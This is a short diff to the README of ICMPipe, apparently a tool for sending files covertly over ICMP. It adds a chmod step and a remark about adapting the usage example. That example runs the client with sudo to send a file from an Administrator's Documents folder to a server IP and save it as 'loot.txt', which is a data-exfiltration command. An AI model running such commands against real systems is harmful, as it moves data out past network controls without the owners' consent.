@@ -83,12 +83,18 @@ wget https://raw.githubusercontent.com/almontasercloud-collab/ICMPipe/main/clien
 git clone https://github.com/almontasercloud-collab/ICMPipe.git
 ```
 
+- Add execution permition
+
+```bash
+sudo chmod 775 ./ICMPipe-Client
+```
+
 - Display command usage:
 
 ```bash
 sudo ./ICMPipe-Client
 ```
-- **(Example)** Select the file, interface, server IP and output path:
+- **(Example)** Select the file, interface, server IP and output path: (change based on your setup)
 
 ```bash
 sudo ICMPipe-Client -p "C:\Users\Administrator\Documents\test.txt" -i eth0 -ip 172.16.2.10 -O ./loot.txt
